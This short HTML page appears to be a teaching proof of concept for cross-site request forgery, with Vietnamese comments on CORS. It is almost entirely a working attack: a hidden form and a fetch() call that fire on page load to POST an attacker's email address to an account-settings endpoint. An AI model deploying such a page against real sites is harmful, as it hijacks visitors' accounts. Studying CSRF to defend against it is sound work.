<!DOCTYPE html>
<html>
<body>
    <form action="http://csrf-main.io/user/email"
        method="POST">
        <input name="email"
            value="malicious-email@example.com" />
    </form>

    <script>
        // document.forms[0].submit();
		
		// Gọi AJAX sẽ bị lỗi CORS
		// Nhưng nếu server cấu hình CORS sai thì vẫn gọi được
		fetch('http://csrf-main.io/user/email', {
			method: 'POST',
			body: JSON.stringify({ email: 'malicious-email@example.com' }),
			headers: { 'Content-Type': 'application/json; charset=UTF-8' },
		});
    </script>
</body>
</html>
